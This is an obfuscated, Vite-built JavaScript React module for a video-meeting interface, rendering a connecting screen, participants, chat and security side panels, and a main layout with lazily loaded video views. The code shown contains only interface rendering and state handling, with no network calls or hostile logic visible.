                    'className': a1_0x4c166e('w-32\x20h-32\x20rounded-3xl\x20flex\x20items-center\x20justify-center\x20mx-auto\x20mb-8', 'bg-white\x20dark:bg-gray-800\x20shadow-2xl\x20border', _0x5c986d[_0x166471(0x17d)]),
                    'children': _0x5c986d['icon']
                }), a1_0x494423[_0x166471(0x18c)]('div', {
                    'className': _0x166471(0x19a),
                    'children': [a1_0x494423['jsxs']('div', {
                        'className': 'text-center',
                        'children': [a1_0x494423['jsx']('h2', {
                            'className': a1_0x4c166e('text-3xl\x20font-bold\x20mb-3', _0x5c986d['color']),
                            'children': _0x5c986d['name']
                        }), a1_0x494423[_0x166471(0xf5)]('p', {
                            'className': 'text-gray-600\x20dark:text-gray-400\x20text-lg',
                            'children': _0x166471(0xf7)
                        })]
                    }), a1_0x494423[_0x166471(0xf5)]('div', {
                        'className': 'flex\x20space-x-2',
                        'children': [0x0, 0x1, 0x2][_0x166471(0x122)](_0x53d860 => a1_0x494423['jsx']('div', {
                            'className': a1_0x4c166e(_0x166471(0xec), 'bg-gradient-to-r\x20' + _0x5c986d[_0x166471(0x100)]),
                            'style': {
                                'animationDelay': 0.1 * _0x53d860 + 's'
                            }
                        }, _0x53d860))
                    }), a1_0x494423[_0x166471(0x18c)](_0x166471(0x125), {
                        'className': 'text-sm\x20text-gray-500\x20dark:text-gray-400\x20space-y-1',
                        'children': [a1_0x494423['jsxs']('p', {
                            'children': ['Meeting\x20ID:\x20', _0x185b96['meetingInfo']['id']]
                        }), a1_0x494423['jsxs']('p', {
                            'children': [_0x166471(0x1af), _0x185b96['meetingInfo']['host']]
                        })]
                    })]
                })]
            })
        });
    },
    F = () => {
        const _0x225375 = a1_0x15a3f4,
            {
                state: _0x4b2f65,
                dispatch: _0x44ee65
            } = a1_0x1b1157();
        return _0x4b2f65['showParticipantsPanel'] || _0x4b2f65[_0x225375(0x16c)] || _0x4b2f65['showSecurityPanel'] ? a1_0x494423['jsxs'](_0x225375(0x125), {
            'className': a1_0x4c166e('fixed\x20lg:relative\x20top-0\x20right-0\x20w-80\x20h-full\x20bg-white\x20dark:bg-gray-800\x20border-l\x20border-gray-200\x20dark:border-gray-700\x20z-40', 'transform\x20transition-transform\x20duration-300', _0x4b2f65['showParticipantsPanel'] || _0x4b2f65[_0x225375(0x16c)] || _0x4b2f65['showSecurityPanel'] ? _0x225375(0x14c) : _0x225375(0x196)),
            'children': [a1_0x494423[_0x225375(0x18c)]('div', {
                'className': 'flex\x20items-center\x20justify-between\x20p-4\x20border-b\x20border-gray-200\x20dark:border-gray-700',
                'children': [a1_0x494423[_0x225375(0x18c)](_0x225375(0x125), {
                    'className': 'flex\x20items-center\x20space-x-2',
                    'children': [_0x4b2f65['showParticipantsPanel'] && a1_0x494423['jsx'](a1_0x54c43b, {}), _0x4b2f65['showChatPanel'] && a1_0x494423['jsx'](a1_0x417739, {}), _0x4b2f65['showSecurityPanel'] && a1_0x494423[_0x225375(0xf5)](a1_0x56b169, {}), a1_0x494423['jsxs'](_0x225375(0xfe), {
                        'className': _0x225375(0x188),
                        'children': [_0x4b2f65['showParticipantsPanel'] && 'Participants', _0x4b2f65['showChatPanel'] && 'Chat', _0x4b2f65[_0x225375(0x139)] && 'Security']
                    })]
                }), a1_0x494423['jsx']('button', {
                    'onClick': () => _0x44ee65({
                        'type': 'TOGGLE_PANEL',
                        'payload': ''
                    }),
                    'className': _0x225375(0x15a),
                    'children': a1_0x494423['jsx'](a1_0x4f1a50, {})
                })]
            }), _0x4b2f65['showParticipantsPanel'] ? a1_0x494423['jsxs']('div', {
                'className': 'p-4',
                'children': [a1_0x494423['jsxs']('h3', {
                    'className': 'font-semibold\x20text-lg\x20mb-4',
                    'children': [_0x225375(0x187), _0x4b2f65[_0x225375(0x137)]['length'] + 0x1, ')']
                }), a1_0x494423['jsxs']('div', {
                    'className': 'space-y-3',
                    'children': [a1_0x494423['jsxs']('div', {
                        'className': 'flex\x20items-center\x20p-3\x20bg-blue-50\x20dark:bg-blue-900/20\x20rounded-lg',
                        'children': [a1_0x494423[_0x225375(0xf5)]('div', {
                            'className': 'w-8\x20h-8\x20rounded-full\x20bg-blue-500\x20flex\x20items-center\x20justify-center\x20text-white\x20text-sm\x20font-semibold\x20mr-3',
                            'children': 'YO'
                        }), a1_0x494423[_0x225375(0x18c)](_0x225375(0x125), {
                            'className': _0x225375(0x10d),
                            'children': [a1_0x494423['jsx'](_0x225375(0x125), {
                                'className': _0x225375(0x1a4),
                                'children': _0x4b2f65['currentUser'][_0x225375(0x15c)]
                            }), a1_0x494423[_0x225375(0xf5)](_0x225375(0x125), {
                                'className': 'text-sm\x20text-gray-600\x20dark:text-gray-400',
                                'children': _0x225375(0x189)
                            })]
                        })]
                    }), _0x4b2f65['participants'][_0x225375(0x122)](_0x5ea326 => a1_0x494423['jsxs']('div', {
                        'className': 'flex\x20items-center\x20p-3\x20bg-gray-50\x20dark:bg-gray-800\x20rounded-lg',
                        'children': [a1_0x494423['jsx']('img', {
                            'src': _0x5ea326[_0x225375(0x1e1)],
                            'alt': _0x5ea326[_0x225375(0x15c)],
                            'className': 'w-8\x20h-8\x20rounded-full\x20object-cover\x20mr-3'
                        }), a1_0x494423['jsxs']('div', {
                            'className': 'flex-1',
                            'children': [a1_0x494423[_0x225375(0x18c)](_0x225375(0x125), {
                                'className': 'font-medium\x20flex\x20items-center\x20space-x-2',
                                'children': [a1_0x494423['jsx']('span', {
                                    'children': _0x5ea326[_0x225375(0x15c)]
                                }), _0x5ea326[_0x225375(0x175)] && a1_0x494423['jsx'](a1_0x9ce02d, {
                                    'className': _0x225375(0x10e),
                                    'size': 0xc
                                })]
                            }), a1_0x494423['jsx']('div', {
                                'className': 'text-sm\x20text-gray-600\x20dark:text-gray-400',
                                'children': _0x5ea326['role']
                            })]
                        }), a1_0x494423['jsx']('div', {
                            'className': a1_0x4c166e(_0x225375(0x1d7), _0x5ea326['isMuted'] ? _0x225375(0x17a) : 'bg-green-500')
                        })]
                    }, _0x5ea326['id']))]
                })]
            }) : _0x4b2f65[_0x225375(0x16c)] ? a1_0x494423['jsxs'](_0x225375(0x125), {
                'className': _0x225375(0x1c2),
                'children': [a1_0x494423['jsx']('h3', {
                    'className': 'font-semibold\x20text-lg\x20mb-4',
                    'children': 'Meeting\x20Chat'
                }), a1_0x494423['jsx'](_0x225375(0x125), {
                    'className': _0x225375(0x1d0),
                    'children': a1_0x494423[_0x225375(0x18c)]('div', {
                        'className': _0x225375(0x1e6),
                        'children': [a1_0x494423[_0x225375(0xf5)](a1_0x417739, {
                            'className': 'text-2xl\x20mx-auto\x20mb-2'
                        }), a1_0x494423['jsx']('p', {
                            'children': 'Chat\x20messages\x20will\x20appear\x20here'
                        })]
                    })
                })]
            }) : _0x4b2f65['showSecurityPanel'] ? a1_0x494423[_0x225375(0x18c)]('div', {
                'className': 'p-4',
                'children': [a1_0x494423['jsx']('h3', {
                    'className': 'font-semibold\x20text-lg\x20mb-4',
                    'children': _0x225375(0xfb)
                }), a1_0x494423['jsxs']('div', {
                    'className': 'space-y-4',
                    'children': [a1_0x494423['jsxs'](_0x225375(0x125), {
                        'className': 'flex\x20items-center\x20justify-between\x20p-3\x20bg-gray-50\x20dark:bg-gray-800\x20rounded-lg',
                        'children': [a1_0x494423['jsx']('span', {
                            'children': 'Waiting\x20Room'
                        }), a1_0x494423[_0x225375(0xf5)]('div', {
                            'className': _0x225375(0x154),
                            'children': a1_0x494423['jsx'](_0x225375(0x125), {
                                'className': 'w-6\x20h-6\x20bg-white\x20rounded-full\x20absolute\x20left-0\x20top-0\x20shadow-md\x20transform\x20transition-transform'
                            })
                        })]
                    }), a1_0x494423['jsxs']('div', {
                        'className': 'flex\x20items-center\x20justify-between\x20p-3\x20bg-gray-50\x20dark:bg-gray-800\x20rounded-lg',
                        'children': [a1_0x494423['jsx']('span', {
                            'children': _0x225375(0x184)
                        }), a1_0x494423['jsx']('div', {
                            'className': _0x225375(0x1c5),
                            'children': a1_0x494423['jsx']('div', {
                                'className': 'w-6\x20h-6\x20bg-white\x20rounded-full\x20absolute\x20right-0\x20top-0\x20shadow-md\x20transform\x20transition-transform'
                            })
                        })]
                    })]
                })]
            }) : void 0x0]
        }) : null;
    },
    K = a1_0x48812b['lazy'](() => a1_0x45edaa(() =>
        import ('./VideoGrid-CUyw7B4_.js'), __vite__mapDeps([0x0, 0x1, 0x2, 0x3, 0x4]))),
    $ = a1_0x48812b[a1_0x15a3f4(0x124)](() => a1_0x45edaa(() =>
        import (a1_0x15a3f4(0x14a)), __vite__mapDeps([0x5, 0x1, 0x2, 0x3, 0x4]))),
    W = () => {
        const _0x6f1286 = a1_0x15a3f4,
            {
                state: _0xf12f56
            } = a1_0x1b1157();
        return _0xf12f56[_0x6f1286(0x163)] ? a1_0x494423['jsx'](B, {}) : a1_0x494423['jsxs'](_0x6f1286(0x125), {
            'className': a1_0x4c166e('min-h-screen\x20flex\x20flex-col\x20transition-colors\x20duration-300', _0xf12f56['darkMode'] ? 'bg-gray-900\x20text-white' : 'bg-gray-100\x20text-gray-900'),
            'children': [a1_0x494423['jsx'](A, {}), a1_0x494423['jsxs'](_0x6f1286(0x125), {
                'className': 'flex-1\x20flex',
                'children': [a1_0x494423[_0x6f1286(0xf5)]('main', {
                    'className': a1_0x4c166e(_0x6f1286(0x17c), _0xf12f56['showParticipantsPanel'] || _0xf12f56['showChatPanel'] || _0xf12f56['isAdmin'] ? 'lg:mr-80' : ''),
                    'children': a1_0x494423['jsx'](_0x6f1286(0x125), {
                        'className': _0x6f1286(0x128),
                        'children': a1_0x494423['jsx'](a1_0x48812b['Suspense'], {
                            'fallback': a1_0x494423[_0x6f1286(0xf5)](_0x6f1286(0x125), {
                                'className': _0x6f1286(0x1de),
                                'children': a1_0x494423['jsx']('div', {
                                    'className': _0x6f1286(0x1df)
                                })
                            }),
                            'children': _0x6f1286(0x132) === _0xf12f56['viewMode'] ? a1_0x494423['jsx'](K, {
                                'participants': _0xf12f56['participants'],
                                'currentUser': _0xf12f56['currentUser']
                            }) : a1_0x494423[_0x6f1286(0xf5)]($, {
                                'participants': _0xf12f56[_0x6f1286(0x137)],
                                'activeSpeaker': _0xf12f56['activeSpeaker'],
                                'currentUser': _0xf12f56[_0x6f1286(0x14f)]
                            })
                        })
                    })
                }), a1_0x494423['jsx'](F, {}), _0xf12f56[_0x6f1286(0x1cd)] && a1_0x494423['jsx']('div', {
                    'className': 'fixed\x20lg:relative\x20top-0\x20right-0\x20w-80\x20h-full\x20z-40\x20transform\x20transition-transform\x20duration-300\x20translate-x-0',
                    'children': a1_0x494423['jsx'](a1_0x19b995, {})
                })]
            }), a1_0x494423['jsx'](D, {}), !_0xf12f56['isAuthenticated'] && _0xf12f56['showAuthModal'] && a1_0x494423['jsx'](Z, {})]
        });
    };
export {
    W as
    default
};